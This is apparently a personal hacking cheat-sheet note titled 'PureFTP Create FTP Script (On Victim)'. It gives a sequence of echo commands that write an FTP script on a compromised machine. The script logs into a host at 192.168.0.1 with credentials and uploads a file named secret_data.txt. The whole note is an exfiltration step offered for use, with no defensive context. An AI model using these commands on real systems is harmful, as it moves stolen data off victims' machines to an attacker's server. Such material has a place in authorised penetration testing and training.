# PureFTP Create FTP Script (On Victim)

```
echo open 192.168.0.1>> ftp.txt
echo USER myftpuser>> ftp.txt
echo mypassword>> ftp.txt
echo bin>> ftp.txt
echo put secret_data.txt>> ftp.txt
echo bye >> ftp.txt
```

# Related
- [20221003150623](/zet/20221003150623/README.md) PureFTP
- ~/kb/hacking/commands/pureftp-commands.md

Tags:
    #assorted #command #hacking #pureftp
